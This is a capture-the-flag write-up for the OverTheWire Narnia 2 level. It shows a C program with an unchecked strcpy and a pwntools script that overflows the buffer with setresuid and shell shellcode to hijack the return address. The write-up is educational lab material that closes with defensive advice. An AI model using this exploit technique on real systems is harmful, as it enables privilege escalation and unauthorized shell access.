---
title: Narnia2

published: 2025-06-19

description: ShellCode with buffer overflow

tags: [pwn, shellcode, buffer overflow]

category: overthewire-narnia
---

# Narnia 2

## C File

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```


## Approach

The first thing we can see when looking at the code is that the `strcpy` is unsafe. If `argv[1]` is larger than the buffer this will overflow onto the next items on the stack

This means we can rewrite the return address and jump somewhere

Lets set the return address to the `buf` variable and fill it with shellcode that will be executed

## Solution

```python
from pwn import *
context.arch = 'i386'
context.os = 'linux'
payload = asm(shellcraft.setresuid() + shellcraft.sh())
payload += b'A' * (132-len(payload))
payload += p32(0xffffd4ec)
#p = gdb.debug(["/narnia/narnia2", payload], gdbscript="source /opt/gef/gdbinit.py")
p = process(["/narnia/narnia2", payload])
p.interactive()
```

First we need to find the offset. We can use `pwn cyclic` and pass that as our argument and use gdb to find out what address it jumps to

Doing that we get an adress of `0x62616169` which we can look up with `pwn cyclic -l 0x62616169` to be an offset of 132

So now we need to craft a payload in the form of shellcode + rest of the overflow + address to buf

We can get the address to buf using gdb by seeing the arguments passed to the strcpy

Then we send the payload, get our shell, and open the flag

## Conclusion

Be very careful with C string functions. Most do not check for size and can result in overflowing the stack or heap.

Use functions that take in size like `strncpy` instead to avoid overflowing
